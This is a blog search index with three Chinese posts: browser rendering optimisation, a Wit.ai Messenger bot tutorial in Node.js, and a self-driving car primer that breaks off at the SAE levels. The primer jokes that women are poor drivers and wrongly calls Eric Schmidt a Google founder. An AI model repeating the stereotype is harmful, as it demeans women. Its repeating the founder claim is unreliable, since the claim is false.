<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Browser Rendering Optimization</title>
    <url>/2016/04/02/Browser-Rendering-Optimization/</url>
    <content><![CDATA[
“My name is Barry Allen, and I’m the fastest man alive …”“Wait..reverse flash is faster then you, zoom is faster than you..”



今天來談談Browser Rendering Optimisation。
相信大家小時候都好奇過早期的電影、卡通或動畫，是怎麼樣製作出來的，而我們也都知道基本上就是一連串的畫面以非常快速的方式做切換，矇騙你的視覺讓你感受到是連續的影片，而Browser其實也是類似的做法，當取得Server的回應後，瀏覽器便把接收到的HTML畫出來，而每當你的網頁有所變化時，Browser就會再依據其邏輯將網頁重新渲染一遍，也因此才能看到這麼多漂亮的效果。
而所謂browser rendering optimization就是要讓渲染的過程能夠更快速、更順暢，讓你的網頁畫面如夢似幻、細緻耀眼。
要做到這件事情，就必須提及FPS(Frames per Second)，顧名思義就是每秒畫幾個Frames，一般影片大概是30fps，而多數螢幕畫面的更新頻率是60Hz，因此若我們能將fps極致提升到60fps，理當能有非常棒的畫面呈現！
知道目標後，let’s do some math…60fps = 60 frames per second = 60 frames every 1000ms好的從我們優異的數學能力下得知，要達到60fps，我們繪製一個frames的時間必須在16.6666…ms左右(1000&#x2F;60)
ok，那要怎麼知道自己的網頁每個frames花了多少時間繪製？拜Google大神所賜，只要打開Chrome的devTool，切換到Timeline的tab，就可以很容易的知道網頁在browser上的render時間。讓我們用畫面超級old school的pchome拍賣來Demo一下：

先別被圖中五顏六色的區塊嚇到，在我們說明這Tool該如何使用之前，必須先瞭解Browser的Render過程，以及這圖片中每個顏色所代表的意義。
接觸過HTML的人一定都知道所謂的DOM Tree，Browser會解析HTML並轉換成DOM Tree做操作，但知道Render Tree的人可能就不多了，Render tree由DOM tree與CSS結合產生，Browser就是依照Render Tree來決定該在畫面上呈現什麼東西。若你今天在某個div的css上加上display: none，那這個div就不會再Render tree上呈現。

既然Render的過程也是一棵Tree，有點概念的人可能會想：每次style改變或是我更動DOM的位置時，這棵Tree也就會變動了吧？沒錯！在整個Browser的Render過程中，就是會不斷去recalculating style、layout的關係，來建構這棵樹。
當然Browser的渲染過程不止這些，還必須載入js, css, web api等等的資源，因此有所謂的Rendering Pipeline
從圖上可以發現其順序為：

Javascript: 載入與執行JS&#x2F;CSS
Style: 根據js與css計算style
Layout: 當style套入元素時，瀏覽器要檢查是否會影響到整個畫面的排列，並進行排列
Paint: 排列後有更動到的元素需要重新繪製（第一次載入的話當然是全部繪製）
Composite: 最後就是將所有元素重新合成回來（重新繪製的元素與原本的元素）

實際上並非每次的前端更動都會執行這五個步驟，若你只有切換顏色、圖片等不影響版面配置的動作，browser會跳過Layout，直接進行Paint；或著你捲動網頁、css的動畫效果，這類操作則會跳過style與layout，直接進行Composite。
接下來我們回到Timeline這個tool。
你可以直接在你想觀察的網頁打開Timeline，並重新整理，他就會自行錄製；或是你可以在你想觀察的操作步驟進行前（ex. 滑動頁面、打開menu bar等等）按下錄製。

接著在你覺得適合的地方（通常就是步驟執行完後）按下Finish。

基本上就能得到下列的Timeline結果。從這張圖片可以清楚看到每個frame花了多少時間，在Render pipeline中發生了哪些事情，值得注意的是，圖片右上角有個紅色小三角形，若你的frame中有這個標記，就代表Chrome認為這段frame有可以改善的部分。大家不妨到自己的網頁打開Timeline，看看有多少東西需要改進XD
在認識了工具後，總是要實際操作一遍才會有感受，這邊以三種角度來進行Optimization。
Javascript一般來說，前端工程師常常會利用setTimeout或是setInterval來製作一些動畫效果，你可能會寫下面這樣的code:
example setInterval
setInterval.jsvar timer = &#123;time: 0&#125;;function counter(timer) &#123;   timer.time = timer.time+1;  document.querySelector(&quot;#counter&quot;).innerHTML = timer.time;&#125;setInterval(counter.bind(null,timer), 1000); 

或著是
example setTimeout
setTimeout.jsvar timer = &#123;time: 0&#125;;function counter(timer) &#123; 	setTimeout(counter.bind(null,timer), 1000);	timer.time = timer.time+1;	document.querySelector(&quot;#counter&quot;).innerHTML = timer.time;&#125;counter(timer);
兩者都可以讓你達到同樣的效果，但是setTimeout跟setInterval對Browser來說都有個主要缺點，就是他**想執行時就會執行，而不會依據你的Browser狀況**；另外當你切換到別的Tab時，setTimeout還會繼續Render。（理論上user看不到畫面，Browser就可以不用執行，以節省效能）不過現在許多瀏覽器都已經利用某些方式讓setTimeout在不需要Render時暫停工作。
除了setTimeout與setInterval外，我們其實還有另一個選擇 requestAnimationFrame
假設我們有個Draw的動畫function，用setTimeout是這樣實作：
draw.jsfunction draw() &#123;    setTimeout(draw, 16); // 16ms per frame!    // Drawing&#125;draw();
若是用requestAnimationFrame：
draw-RAF.jsfunction draw() &#123;	// Drawing	requestAnimationFrame(draw);&#125;requestAnimationFrame(draw);
就這麼簡單，用了requestAnimationFrame之後，Browser就會綜合考量javascript所產生的動畫，一起刷新螢幕，並在動畫不在viewport時，暫停工作，以節省資源。
當然你會想說，那如果我想控制animation的timing怎麼辦？以前面的counter例子來看，你可以這樣做：
example reqeustAnimationFrame
RAF_timeervar timer = &#123;time: 0&#125;;function counter(timer) &#123;   setTimeout(function()&#123;    requestAnimationFrame(counter.bind(null, timer));    timer.time = timer.time+1;    document.querySelector(&quot;#counter&quot;).innerHTML = timer.time;  &#125;, 1000);&#125;counter(timer);
Style &amp; Layout除了JS外，在頁面上操作畫面大多免不了觸發Style &amp; Layout這兩個Render Pipeline的步驟。既然免不了這些步驟，我們能做的就是盡量減少這些步驟的產生，大家可以到這裡（How (not) to trigger a layout in WebKit）看看在有哪些操作我們要盡量減少。
當然，光說不練感受不到差別，讓我們來練習一個例子：
example Layout trigger
befor-optimization.js(function() &#123;  // noprotect  var sizer = document.querySelector(&#x27;.sizer&#x27;);  document.querySelector(&#x27;.set-size&#x27;).addEventListener(&#x27;click&#x27;, function(event) &#123;    var ps = document.querySelectorAll(&#x27;.article .article-block&#x27;);    var i = ps.length;    var size;    while (i--) &#123;      finalHeight = sizer.offsetHeight;      ps[i].style.height = finalHeight + &#x27;px&#x27;;    &#125;    event.preventDefault();  &#125;);&#125;());
example Less Layout trigger
after-optimization(function() &#123;  // noprotect  var sizer = document.querySelector(&#x27;.sizer&#x27;);  document.querySelector(&#x27;.set-size&#x27;).addEventListener(&#x27;click&#x27;, function(event) &#123;    var ps = document.querySelectorAll(&#x27;.article .article-block&#x27;);    var i = ps.length;    var size;    var finalHeight = sizer.offsetHeight;    while (i--) &#123;      ps[i].style.height = finalHeight + &#x27;px&#x27;;    &#125;    event.preventDefault();  &#125;);&#125;());
仔細看就會發現其實只有一行code有變動，效果卻差很多！當你在操作類似DOM物件的時候可以參考上述的網站，避免不必要的re-layout動作。
Composite在一個網頁的頁面當中，實際上並非是平面的，通常會由許多Layer所組成，而在Browser rendering pipeline的最後一個步驟Composite中，就是負責將這些Layer組合成完整的頁面。
我們這次以最近Live直播統一獅頗為熱門的Yahoo首頁為例子，依照先前的方式打開Dev tool中的Timeline，選取其中一段frame後，點選下方的Layers標籤，應該就可以看到類似下面的圖：
可以發現yahoo首頁也是由許多層Layer所組成。
眼尖的讀者可能會發現為什麼頁面中只有一個區塊是綠色的？這就是這小節的重點了，在Composite的過程中，只有需要重新Style與Layout的Layer才需要重繪，而這些需要重繪的Layer就會被標註成綠色；以yahoo首頁為例，綠色的那條是影音列表，理當會不斷變動，因此會被Highlight為綠色。
那為什麼我們需要針對這個步驟做Optimize呢？因為假如在同一層layer中，你其實只有某一個div需要re-layout，但由於是在同一個Layer，會變成整個Layer都需要重新繪製，如此一來就會增加不必要的負擔。
因此我們可以在你確定會需要重繪制的div中，加入will-change: transform;這個屬性，告訴browser說，“欸~我知道我可能會變動喔，請不要把大家跟我視為一樣的”，這樣就能解決上述的問題。
大家不妨打開自己的網站，利用Chrome的Timeline玩看看，提升頁面的渲染效率，讓我們一起追求60ps的極致快感吧！
延伸閱讀
How not to trigger layout in webkit
Google Web Fundamentals
Accelerated Rendering in Chrome

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>Browser Rendering Optimization</tag>
        <tag>frontend</tag>
        <tag>web</tag>
        <tag>web performance</tag>
        <tag>網頁效能</tag>
        <tag>網站效能</tag>
      </tags>
  </entry>
  <entry>
    <title>利用 Wit.ai 讓你的 Messenger Bot 更聰明！</title>
    <url>/2016/07/02/ChatBot-with-Wit/</url>
    <content><![CDATA[今天我們要讓我們的 Chat Bot 更加聰明，利用被 Facebook 收購的 Wit.ai 所提供之 API，可以很方便的讓 Chat Bot 有了 NLP 的支援，讓他&#x2F;她更加聰明！
實際上 Wit.ai 的介面並沒有我想像中的好用，需要很有耐心地把官網上的教學一步步做完，並且了解他所定義的名詞代表之含義，雖然寫得很詳細，但畢竟是英文，因此就記錄一下整個過程，並跟大家分享。

Step 1 註冊 Wit.ai 帳號先到 Wit.ai 的官方網站註冊一個帳號，有 GitHub 與 Facebook 可以選擇。

Step 2 Dashboard 設定接著你會進到你的 Dashboard

點選右上角的 + 號，進入 App 設定頁面，進行簡單的設定，基本上只要設定 名字 與 描述，語言等等之後還能修改。這邊要提一下，我本來想設定成 Chinese，但後來在建立機器人對話故事時，發現他的中文支援好像還不是很完善，常常判斷不出 Entity，因此這邊還是先以英文為例子，如果有高手知道怎麼解的話也歡迎告訴我！

Step 3 創建對話情境 (Story)繼續，設定完後就進入到編輯界面，在 Wit.ai 裡面，你的機器人與一般使用者的對話情境，都叫做 Story，你可以透過創建 Story 來定義出在這個情境下，你的機器人要怎麼跟使用者對話。

整個介面就像是一個對話視窗，看起來頗親切，左邊是 User says，右邊是 Bot sends, Box executes 與 Jump。先簡單介紹，看完後面的例子會更清楚。

User says： 顧名思義就是定義 User 會說的話，並且你可以設定 User 的句子中，有哪些關鍵字是你需要的、哪些文字是代表什麼含意，在 Wit.ai 的世界中，這樣的東西叫做 Entity，後面會再度說明。

Bot sends： 就是機器人要回覆的句子，這邊可以帶入一些參數，像是 user 所提及的一些關鍵字，或是機器人向外呼叫 API 所得到的結果。

Box executes： 就是讓你定義機器人要執行的 function，真正的實作不會在這邊，這邊只是定義名稱，以及要接收的 context 與 吐回的變數名稱。

Jump： 則是讓你能夠在滿足設定的一些條件之下，跳回到某個 Box executes 或是 Box sends 的步驟去執行。


Step 4 定義使用者語句接下來我們先定義 User 可能會對我們的機器人說的話，像是使用者可能會跟機器人打招呼，我們就可以在對話框的 User says 輸入 Hello，並且 highlight 起來以後設定 Entity，Enity 在 Wit.ai 裡面，就是用來讓系統判斷使用者輸入句子時，哪些關鍵字是要抽取出來做處理的，你可以依照該關鍵字的特型來設定相對應的 Entity 類別。這邊我們就自定義一個 Entity 名稱叫做 greeting，當然 Wit.ai 也有許多內建好的 Entity，當你點選 Add a new entity 時，他會有提示。

你可能會想說，打招呼又不會只說 Hello，你這樣設定的話，我照之前方法 hardcode 寫在 server side 就好了呀，要 Wit.ai 幹麻。
Wit.ai 當然沒有這麼簡單，介面上方的 Tab 是不是有個學士帽寫著 Understanding？ 在這個地方你有三種方式可以用來訓練你的機器人：

增加例句：

在上方寫著 Test how your bot understands a sentence 的地方輸入更多的例句，並且如同前面步驟般去定義 Entity，這邊要注意的是，當你輸入完例句後，記得點選下方綠色的 Validate，讓 Wit.ai 去記住你的例句。成功的話就會看到下方 Entity 的 Values 欄位會多出你剛剛例句中所抓取到的關鍵字（以下圖例子來說就是 Hi 也被我們納進 greeting 這個 entity內了，只要之後 user 輸入 Hello 或是 Hi，都是屬於 greeting）


增加 Entity 的 Keyword 與 Synonyms：

你也可以點選下方的 Entity 名稱，進去手動增加關鍵字或是同義詞。關鍵字與同義詞的關係有點像是父子類別，這邊舉個比較易懂的例子，如下圖，我們有個 Entity 叫做 Beer，底下的 關鍵字是 啤酒 與 紅酒，當使用者喊出啤酒的時候，機器人就會知道是屬於 Beer 這個 Entity。
但啤酒有很多種種類，我們可以在同義詞這邊增加：蜂蜜啤酒，這樣當使用者輸入 蜂蜜啤酒 時，機器人就會判斷目前的 Beer Entity 的 Value 為 啤酒，而非紅酒。相同的，我們也可以設定 葡萄酒 為 紅酒 的同義詞，讓使用者喊出 葡萄酒 時，機器人會判斷為 紅酒。
要注意的是，機器人記住的 Entity Value 會是以 Keyword 為主，也就是你輸入蜂蜜啤酒，但對機器人來說，偵測到的 Beer Entity，其值為 啤酒，而非蜂蜜啤酒。


設定 Entity 的 Search strategy：

最後在設定 Entity 的地方還有 Search strategy 可以選擇，意思是你希望 Wit.ai 要怎麼樣從句子中找出這個 Entity 。

trait: 如果你想設定的 Entity 並不是由單一一個關鍵字就可以判斷，也不是靠句子中幾個關鍵字或是子句能夠辨別，而是需要整個句子來判定的話，就要設定成 trait，像是今天的例子裡面，想要問新聞，這種使用者的 意圖 就很適合設定成 trait。

官網範例：出處

free-text: 如果你想要擷取使用者句子中的某段文字，而該段文字並不是特定的關鍵字時，就要設定 free-text，像是 User 說：“Tell Jordan that I will be home in ten minutes”，而你想要擷取 ”I will be home in ten miutes”，這時就可以把想要擷取的句子選取起來，設定為 free-text，要注意的是，free-text 一定要搭配 keywords 一起使用，有點像是告訴 Wit.ai 說這段話都算是 keywords，但不一定要 exactly match 才能觸發。

官網範例：出處

keywords: 要完全符合你預先設定的關鍵字才會觸發。

官網範例：出處

Step 5 定義機器人回覆語句介紹了這麼多瑣碎的東西後，回過頭來看看我們要怎麼設定機器人的回覆。以最前面的例子來說，當機器人收到 greeting 的 Entity 後，可以讓用相同的 entity value 回覆，並加上簡單的介紹。點選下方的 Bot sends，對話框就會出現機器人的部分，你可以在裡面輸入機器人的回覆語句，想要的變數可以用&#123; &#125;包起來，這邊我們直接使用 greeting 這個 entity，這樣就能用同樣的 Entity 去回覆。

畫面右下方有個浮動的按鈕 “Press ~ to chat with your bot”，可以讓你即時測試一下。

Step 6 設定機器人執行動作當然機器人不能只單純回話，要能夠執行動作，這邊我們創建另一個對話情境，設定讓我們的機器人幫忙找新聞！這邊我先設定好一個使用者語句與相關 Entity，接著先讓 Bot executes 動作，也就是讓他執行一個 Funtion，這邊只是定義 Function 名稱以及 輸出 的參數，實際的實作要等到後面撰寫程式時才需要。

從上圖來看，我設定了一個 getNews 的函式，並且設定一個context為 newsResult，代表這個 function 會有一個變數 newsResult 可以供外部與自己使用。此外，機器人會先回覆一個訊息，其中包含你的 search_query entity 之 value 
設定完一樣要進行一下測試，當你輸入使用者語句後，機器人會執行函式，並問你要執行哪個 Context，這時你就點選剛剛設定的 newsResult 當作回覆，教導機器人記住這個 context

若使用者沒有說他想找什麼新聞怎麼辦呢？這時候就是另用另一個 Context 來判斷了！你可以設定一些 context branch，透過 先前提到的 Jump ，讓機器人根據 Context 的不同來執行不同回覆。透過定義一個 missNews 的 Context，告訴機器人，當沒有 search_query 時，可以怎麼做。
如下圖，你需要設定一個 BookMark 讓你的機器人可以 Jump 到那個 Context下。

設定完後依然需要先測試一下，訓練一下你的 Bot。在這邊你要告訴機器人目前是哪個 Context 。要注意的是，你必須要把非當下必要的 Context 移除，像是下圖中，在 User 回答 Brexits後，需要把 missNews 這個 context 點選掉，這樣 Bot 才會正常的跳回 getNews。

Step 7 套用 API 與實作 Function前面幾個步驟做完後，就有個基本的使用者與機器人互動情境，接下來就可以開始實作函式，並套用 API 了。這邊以 Node.js 為例子，你需要先到你的專案底下加入 node-wit 這個 package。
npm install --save node-wit

之後可以先測試一下，修改官方的 example/quickstart.js，實作出 getNews 函式，這邊先簡單 echo 一下就好。程式碼短短的，你需要注意的是 actions 這個 object，裡面定義了 Bot 要執行的動作函式，send 是用來讓 Bot 回話的，這一定要有，而我們自己定義的 getNews 就定義在下方。
getNews 裡面利用 firstEntityValue 從接收到的 entities 中找出你要的，這邊我們要的當然是 search_query 的值。接著就可以去進行需要的處理，呼叫 API 等等。
唯一要注意的就是這邊需要使用 Promise 回傳喔！
const actions = &#123;  send(request, response) &#123;    const &#123;sessionId, context, entities&#125; = request;    const &#123;text, quickreplies&#125; = response;    return new Promise(function(resolve, reject) &#123;      console.log(&#x27;sending...&#x27;, JSON.stringify(response));      return resolve();    &#125;);  &#125;,  getNews(&#123;context, entities&#125;) &#123;    return new Promise(function(resolve, reject) &#123;      var search_query = firstEntityValue(entities, &#x27;search_query&#x27;)      if (search_query) &#123;        context.newsResult = search_query + &#x27;最近很多人討論...&#x27; ; // we should call a real API here      &#125; else &#123;        // To-do      &#125;      return resolve(context);    &#125;);  &#125;,&#125;;
執行 node example/quickstart.js &lt;Wit.ai server-side Token&gt;就會得到以下結果。

在這邊先打岔一下，我們回到 Wit.ai 的 Dashboard 看一下，會發現 Inbox 上面有個小紅點？Wit.ai 會在這個地方紀錄 User 傳送進來的句子，並且讓你在這邊操作它，也就是說，你可以在這邊利用 User 傳入的句子來 training 你的機器人！讓他直接從使用者身上學習！我覺得很棒的一個功能！

ok，鏡頭再轉回到程式碼。
已經知道怎麼實作函式了，那就接著把他跟 Messenger api 結合吧！
其實跟剛剛的 quickstart.js 比較不一樣的的地方在於，你必須記錄起來每一個 fb user 的 session，這樣 Wit.ai Bot 才會知道要回傳給哪個 FB user。
// This will contain all user sessions.// Each session has an entry:// sessionId -&gt; &#123;fbid: facebookUserId, context: sessionState&#125;const sessions = &#123;&#125;;const findOrCreateSession = (fbid) =&gt; &#123;  let sessionId;  // Let&#x27;s see if we already have a session for the user fbid  Object.keys(sessions).forEach(k =&gt; &#123;    if (sessions[k].fbid === fbid) &#123;      // Yep, got it!      sessionId = k;    &#125;  &#125;);  if (!sessionId) &#123;    // No session found for user fbid, let&#x27;s create a new one    sessionId = new Date().toISOString();    sessions[sessionId] = &#123;fbid: fbid, context: &#123;&#125;&#125;;  &#125;  return sessionId;&#125;;

接著我們其實就只要修改先前的 quickstart.js 以及 先前實作過的 messenger API 的部分code即可。因為我們的使用情境會讓 Bot 在接收訊息時，立刻先回傳文字，接著才會回傳查詢結果，而查詢結果則需要利用 Messenger API 傳送 GenericMessage 的結果，因此會需要兩種 return Method。
const firstEntityValue = (entities, entity) =&gt; &#123;  const val = entities &amp;&amp; entities[entity] &amp;&amp;              Array.isArray(entities[entity]) &amp;&amp;              entities[entity].length &gt; 0 &amp;&amp;              entities[entity][0].value;  if (!val) &#123;    return null;  &#125;  return typeof val === &#x27;object&#x27; ? val.value : val;&#125;;// Our bot actionsconst actions = &#123;	// Wit.ai 的 action 中，一定要實作的 send method，用來讓機器人說話  send(request, response) &#123;  	const &#123;sessionId, context, entities&#125; = request;    const &#123;text, quickreplies&#125; = response;    // find out user id    const recipientId = sessions[sessionId].fbid;    if (recipientId) &#123;      // 這邊需要判斷要回傳的訊息是否為查詢結果      // 若 context 中帶有 newsResult 那就是要回傳查詢結果      // 因此就要呼叫 sendNewsMessagePromise() 來回傳 GenericMessage      if (context.newsResult) &#123;        // fbBotUtil.sendNewsMessagePromise 這邊是 Messenger API 的相關實作        return fbBotUtil.sendNewsMessagePromise(recipientId, context.newsResult)          .then(() =&gt; null)          .catch((err) =&gt; &#123;            console.error(              &#x27;Oops! An error occurred while forwarding the response to&#x27;,              recipientId,              &#x27;:&#x27;,              err.stack || err            );          &#125;);          &#125; else &#123;          // 直接回傳普通文字          return fbBotUtil.sendTextMessagePromise(recipientId, text)            .then(() =&gt; null)            .catch((err) =&gt; &#123;              console.error(                &#x27;Oops! An error occurred while forwarding the response to&#x27;,                recipientId,                &#x27;:&#x27;,                err.stack || err              );            &#125;);        &#125;      &#125; else &#123;      console.error(&#x27;Oops! Couldn\&#x27;t find user for session:&#x27;, sessionId);      // Giving the wheel back to our bot      return Promise.resolve()    &#125;  &#125;,  // 我們自定義的 getNews action  getNews(&#123;context, entities&#125;) &#123;    return new Promise(function(resolve, reject) &#123;      var search_query = firstEntityValue(entities, &#x27;search_query&#x27;)      if (search_query) &#123;      	// 這邊是去呼叫api      	// fetchr 是我實作的一個小函式，利用 import.io 去抓 Yahoo news 的搜尋結果。      	// 不是這篇重點我就先略過啦~        fetchr(search_query, function(data) &#123;          context.newsResult = data;          console.log(&#x27;context newsResult&#x27;, context.newsResult);          delete context.missNews;        &#125;);              &#125; else &#123;        context.missNews = true;        delete context.newsResult;      &#125;      return resolve(context);    &#125;);  &#125;,&#125;;

實作完 Actions 的部分，記得到 router 裡面去增加 Wit.ai 的相關 Setting
const wit = new Wit(&#123;  accessToken: &lt;Wit.ai TOKEN&gt;,  actions,&#125;);
router.post(&#x27;/&#x27;, function (req, res) &#123;  messaging_events = req.body.entry[0].messaging;  for (i = 0; i &lt; messaging_events.length; i++) &#123;    event = req.body.entry[0].messaging[i];      sender = event.sender.id;      var sessionId = findOrCreateSession(sender);      if (event.message &amp;&amp; event.message.text) &#123;        text = event.message.text;        // Handle a text message from this sender        wit.runActions(          sessionId, // the user&#x27;s current session          text, // the user&#x27;s message          sessions[sessionId].context // the user&#x27;s current session state        ).then((context) =&gt; &#123;          // Our bot did everything it has to do.          // Now it&#x27;s waiting for further messages to proceed.          console.log(&#x27;Waiting for next user messages&#x27;);          // Updating the user&#x27;s current session state          sessions[sessionId].context = context;        &#125;)        .catch((err) =&gt; &#123;          console.error(&#x27;Oops! Got an error from Wit: &#x27;, err.stack || err);        &#125;)      &#125;  &#125;  res.sendStatus(200);&#125;);
上面這大串 code 其實就是接收到你在 Messenger POST 出去的訊息後，呼叫定義好的 wit.runActions，然後就可以讓 Wit.ai 幫你分析 User 的語句，並且回覆出去。
最後這邊放一下送出 我這邊用到的 fbBotUtil.sendNewsMessagePromise，也就是送出 messenger GenericMessage 的程式碼
Messenger GenericMessage API Usage
Final Result剛剛我們設定的語句，是不是就透過 Messenger 送出來了呢～

One more thing最後介紹一個方便的工具，ngrok。
ngrok 可以讓你把 localhost 轉成外網可以存取的網址，也支援 https，因此我們 Debug 就方便多了，不需要每次都把程式 Deploy 到遠端機器以後才能測試，log 也能直接在本機端終端機看到！
他的設定超簡單，到 https://ngrok.com/download 把程式下載回來，並且執行 ./ngrok http PORT
會出現如下畫面，連 https 的網址都有！這樣一來，facebook要求的 https webhook 就不成問題了，當然實際上運行還是要去用 SSL 憑證啦…

參考資料

Wit.ai Doc
打造我的聊天機器人！系列二：Wit-AI 的語句對話實作

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>Messenger</tag>
        <tag>Wit.ai</tag>
        <tag>Bot</tag>
      </tags>
  </entry>
  <entry>
    <title>一起來用十分鐘略懂自駕車吧！GoGoGo！</title>
    <url>/2017/06/21/Lets-know-a-little-bit-of-Self-Driving-Car/</url>
    <content><![CDATA[[ 前言 ]小弟我並沒有自駕車領域的工作經驗，以下只是#我的觀察啦。希望讀者能藉此略懂自駕車，有錯的地方歡迎指正。
此文章的架構為 Why-What-How 的三大段落：

Why - 為什麼自駕車很重要呢
What - 什麼是自駕車
How - 自駕車是如何運作的

那麼開始吧，GoGoGo！


[ 為什麼自駕車很重要呢 ]主要有三個原因，因為：

自駕車可以救大家的命
自駕車可以節省大家的時間
自駕車可以賺好多好多錢

自駕車可以救大家的命以下這些不良的駕駛行為造成的車禍傷亡將在自駕車普及後消失，像是 技術不好的人：初學者、反應較慢的老人、女…（ Mymy 已被 WomanTalk 板隔空水桶 ），或是 分心的駕駛行為：玩手機、打噴嚏、酒駕等。總之下面極度政治不正確的圖片以後可能無法在 PTT 車禍文章中的推文見到了。
![車禍三寶飯](/img/mymykuo/three-treasure.jpg)（ Photo Credit: [三寶飯][3] ）

事實上，Google 創辦人施密特就曾經說人們根本就不該開車，電腦應該比車子更早發明。當然，以 Google 研發多年自駕車的立場來說，這段言論是再正確不過了。
![Quote by Schmidt](/img/mymykuo/quote-by-schmidt.jpg)（ Photo Credit: [AZQuotes][2] ）

自駕車可以節省大家的時間如何省時呢？

減少塞車
利用開車時間

如何減少塞車呢？自駕車減少車禍必然能減少塞車，但更多的塞車是因為駕駛煞車時產生的衝擊波造成的。看下面這段影片就可以了解大概的原理。這實驗本來是希望大家在圓圈裡等速地開車，但只要有一個人（ 一顆鼠屎 ）踩了不必要的煞車，圓圈就開始塞車了。


詳細的理論我不多做介紹了，有興趣的可以看下面的兩篇文章：

塞車：看不見的時間小偷
我們能否杜絕「塞車幽靈」？

想像一下在未來車聯網的時代，每一輛汽車都知道周圍有哪些車輛和這些車輛的車速，當駕駛知道前方遠處的車輛減速時，就可以透過自動駕駛放鬆油門慢慢減速，減少衝擊波的傳遞來避免塞車。
如何利用開車時間呢？基本上以後不用開車了，駕駛的這段時間你都能好好利用，還保有隱私呢！只要好好發揮人們懶惰的天性和情慾流動的本能，想像力就會是你的超能力。如下示意圖。
![上班睡過頭 車上刷牙](/img/mymykuo/brush-teeth-in-car.jpg)（ 上班睡過頭 - Photo Credit: [Her Campus Media][6] ）

![我倆惺惺相惜](/img/mymykuo/love-each-other-in-car.png)（ 我倆惺惺相惜 - Photo Credit: [壹週刊][7] ）

自駕車可以賺好多好多錢為什麼可以賺好多錢呢？在 2012 年時，因為駕駛輔助的裝置開始受到各國法律的重視，像是行車紀錄器、胎壓偵測或是防撞偵測的設備，IC 產業的分析公司 IC Market 就預測車用電子（ Auto ）會是通訊電子（ Comm ）後成長率第二高的產業。如下圖。這些駕駛輔助的車用電子即是自駕車發展的重要基礎設備。
![IC Market 2011-2016 CAGR](/img/mymykuo/ic-market-2011-2016.jpg)（ Photo Credit: [IC Market][8] ）

如今到了 2016 年，IC Market 預估的車用電子成長率（ 10.3% ）已經超越通訊電子成長率（ 4.8% ）了，僅次於 IoT 成長率（ 13.3% ）。是的，沒錯！目前手機市場已經開始飽和了，所以現在很多公司都轉往開發車用電子的市場，一些車用電子相關的股票都漲不停。
![IC Market 2015-2020 CAGR](/img/mymykuo/ic-market-2015-2020.png)（ Photo Credit: [IC Market][9] ）

簡單來說：手機和 PC 市場已飽和，快沒搞頭了 -&gt; 許多公司們的未來必須靠車用電子了 -&gt; 自駕車剛好是個能集車用電子於大成的酷炫好題目呢！
因此各家廠商從車用電子的軟體端到硬體端，不論軟體廠、系統廠、晶片廠、車廠，都開始積極投入資源開發自駕車，因為真的可以賺好多好多錢。下圖列出幾家代表性的廠商。
![33 Corporations](/img/mymykuo/33-self-driving-corporations.png)（ Photo Credit: [CB Insights][10] ）

簡單舉例一下其中代表性的幾家近期做了啥：

Apple - 2014 年就開始名為 Taitan 的自駕車計畫，因發展方向一直不大明確，團隊成員相繼出走。最近據傳在瑞士祕密實驗室招聘研究員，低調開發自動駕駛技術。

Audi、BMW、Daimler - 2015 年聯手買下 HERE Map，為研發自動駕駛技術鋪路。

Google - 最早開始，也是目前技術最領先的。但隨著競爭對手變多、遲遲未商業化、CTO Chris Urmson 離職，讓外界開始有 Google 將在自動駕駛車領域落後的聲音，不過 Google 馬上用降低 Lidar 成本的關鍵突破打臉各方的質疑。

Mobileye - 透過影像辨識開發防撞系統聞名的公司，目前各車廠的 ADAS（ Advanced Driver Assistance Systems ）幾乎都是跟它合作。2016 年與 Intel、BMW 結盟開發自駕車，2017 年就被 Intel 收購了。

Nvidia - 因為自動駕駛的技術需要高速運算，所以以 GPU 高速運算聞名的 Nvidia 也來分一杯羹。在 2016 年的 CES 展推出了給自駕車裝載的超級電腦，用 GPU 加速 Deep Learning 的運算（ 目前許多自駕相關的技術都用到 Deep Learning ）。2016 年底，Tesla 推出的車款就是使用此硬體架構。

Tesla - 2016 年 7 月時結束了與 Mobileye 合作開發自駕車的關係。同年 10 月轉向與 Nvidia 合作。

Uber - 本來也想買 Here Map 的，但敵不過車廠們的合作。近期在亞利桑那州的自駕車發生車禍，加上被控盜取 Waymo 自駕車技術，前景堪憂。


從 2016、2017 年的消費電子展（ Consumer Electronics Show，CES ），就可以看出各家廠商對於自駕車市場有多麼看重。有興趣可以參考下面幾則新聞：

2016 CES 展全球車廠精銳盡出，無人駕駛與新能源車為最大趨勢
CES 2017 擘劃後自駕車時代藍圖，發展關鍵在法規而非技術
2017 年 CES 五大主流：VR、自駕車、穿戴裝置、AI、IoT
CES 2017自動駕駛車起飛，台灣車聯網的機會在哪裡？
Here’s why self-driving cars took center stage at CES

[ 什麼是自駕車 ]講完自駕車重要的原因後，來談談到底什麼是自駕車吧。先來看看 Wikipedia 對自駕車的定義。

“An autonomous car ( driverless car, self-driving car, robotic car ) is a vehicle that is capable of sensing its environment and navigating without human input.” – Wikipedia

蒟篛一下：自駕車、無人車、或是機器車，是一種可以 感知環境 和 駕駛時不需人類操作 的車輛。
自駕車如何感知環境主要是用以下的電子設備：

Radar - 用 Radio 來針測物體方位、距離和速度。主要拿來防撞。

Lidar - Radar 是用 Radio，Lidar 是用 Laser，可以更精準且範圍更廣（ 大概 100 公尺 ）的測量物體的方位、角度、距離。主要拿來建超精細的 3D Map。

Camera -  負責電腦視覺處理，辨識行人、交通號誌、物體距離、道路白線。

Ultrasonic Sensor -  用聲波針測物體方位、距離和速度，拿來防撞和偵測停車空間。

GPS - 用來定位，缺點是有誤差。


自動駕駛時不需什麼人為操作自駕時有三個項目可以不需要人為操作：

加速
煞車
方向盤

不需操作的項目愈多，人為的介入愈少，代表自駕車的等級愈高。以下會詳細介紹怎麼將自駕車作等級分類。
SAE 自駕車等級分類表SAE（ Society of Automotive Engineers ）International 美國汽車工程師協會針對不同自動駕駛的程度，分成 0~5 的等級，等級愈高自駕的程度愈高，但也愈難達成。如下圖。
![SAE Self-Driving Car Levels](/img/mymykuo/sae-self-driving-car-levels.png)（ Photo Credit: [SAE International][28] ）

事實上上面這張圖已經超詳細了（ 字太多又英文大家一定懶得看 ），但為了方便解釋我用白話整理成下表。
![SAE Self-Driving Car Levels in Chinese](/img/mymykuo/sae-self-driving-car-levels-in-chinese.png)

由左到右是 0~5 的自駕車等級，各個 Level 的重點如下：

